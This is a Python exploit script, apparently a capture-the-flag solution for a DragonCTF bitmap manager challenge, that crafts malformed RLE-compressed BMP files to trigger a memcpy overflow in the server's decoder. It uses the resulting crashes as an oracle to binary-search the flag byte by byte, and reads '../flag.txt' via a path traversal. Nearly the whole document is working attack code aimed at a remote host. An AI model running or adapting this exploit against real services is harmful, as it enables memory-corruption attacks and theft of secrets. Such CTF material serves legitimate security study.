# Writeup at https://faraz.faith/2020-11-23-dragonctf-bitmapmanager/
# Credits to https://twitter.com/RBTree_

import struct
from pwn import *

def make_image(length, check):
    t = b"BM" # signature
    t += struct.pack("<I", length) # file size
    t += b'\x00' * 4 # reserved, has to be 0
    t += struct.pack("<I", length - 3) # file offset to data

    t += struct.pack("<I", 40) # header size
    t += struct.pack("<I", 128) # width
    t += struct.pack("<I", 1) # height
    t += struct.pack("<H", 1) # cplane
    t += struct.pack("<H", 8) # bitcount
    t += struct.pack("<I", 1) # compression, must be 1 to trigger the bug
    t += struct.pack("<I", 3) # sizeimage
    t += struct.pack("<I", 0) # xpermeter
    t += struct.pack("<I", 0) # ypermeter
    t += struct.pack("<I", 1) # clrused, must be 1 to bypass validation check
    t += struct.pack("<I", 0) # clrimp

    t += b'\x00' * (length - len(t) - 3)

    '''
    The output buffer is always 128 bytes in size, so the steps are:

    1. Fill up (128 - (ord(byte_that_u_check))) bytes in the output buffer.
       This will move the output buffer cursor just past the bytes we fill
    2. The program will do a 
       `memcpy(&outbuf[outbuf_cursor], some_input_data, char_from_flag)`.
       This will overflow and crash the program if the flag char's value is 
       greater than the byte we're checking. It won't crash if the flag char's
       value is less than the byte we're checking, so we use this oracle to
       do a binary search until its just right.
    '''
    t += bytes([128 - check]) # Size to memset (file offset from above points here)
    t += b"A" # Character to memset with
    t += b"\x00" # \x00 to trigger the bug on the second iteration of the while loop

    # Convert it to format thats sendable to the server
    # example: "\x41\x41\x41\x41" gets converted to "41 41 41 41"
    t = t.hex()
    s = ""
    for i in range(0, len(t), 2):
        s += t[i:i+2] + ' '
    
    return s

flag = "DrgnS{" # Skip the first 6 bytes
for i in range(6, 100):
    st, ed = 0, 127 # Binary search start and end parameters

    # When st == ed, we got the flag char
    while st < ed:
        print(st, ed)
        md = (st + ed) // 2 # Get the middle value
        r = remote('bitmap-manager.hackable.software', 4141)
        r.recvuntil('Option:')
        r.sendline('load_builtin')
        r.recvuntil('Name:')
        r.sendline('../flag.txt') # Load the flag into memory

        # Load a (288 + flag_byte_index_to_leak) sized image
        r.recvuntil('Option:')
        r.sendline('load')
        r.recvuntil('Name:')
        r.sendline('rbtree.bmp')
        r.recvuntil('Number of bytes:')
        r.sendline(str(288 + i))
        r.recvuntil('Bitmap data:')
        r.sendline(make_image(0x120 + i, md))

        f = False
        try:
            # If this succeeds, crash wasn't triggered
            r.recvuntil('bitmap decompression failed')
            f = True
            r.close()
        except:
            r.close()
        
        # If this is true, then ord(flag_byte) < ord(guessed_byte)
        # So we reduce the byte we check (i.e we reduce `ed`)
        if f:
            ed = md
        # Else we crashed, so we have to get a larger buffer to not crash
        else:
            st = md + 1

    flag += chr(st)

    print(flag)